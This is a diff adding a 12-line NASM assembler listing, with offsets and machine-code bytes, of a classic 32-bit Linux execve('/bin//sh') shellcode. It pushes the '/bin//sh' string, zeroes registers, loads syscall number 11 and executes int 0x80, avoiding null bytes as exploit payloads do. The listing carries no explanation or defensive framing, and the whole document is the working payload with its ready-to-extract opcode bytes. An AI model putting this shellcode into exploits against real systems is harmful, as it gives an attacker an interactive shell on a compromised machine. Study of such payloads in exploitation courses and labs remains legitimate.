@@ -1,0 +1,12 @@
+     1                                  bits 32
+     2                                  
+     3 00000000 31C0                    xor eax, eax
+     4 00000002 50                      push eax
+     5 00000003 682F2F7368              push '//sh'
+     6 00000008 682F62696E              push '/bin'
+     7 0000000D 89E3                    mov ebx, esp
+     8 0000000F 89C1                    mov ecx, eax
+     9 00000011 89C2                    mov edx, eax
+    10 00000013 6A0B                    push byte 11
+    11 00000015 58                      pop eax
+    12 00000016 CD80                    int 0x80
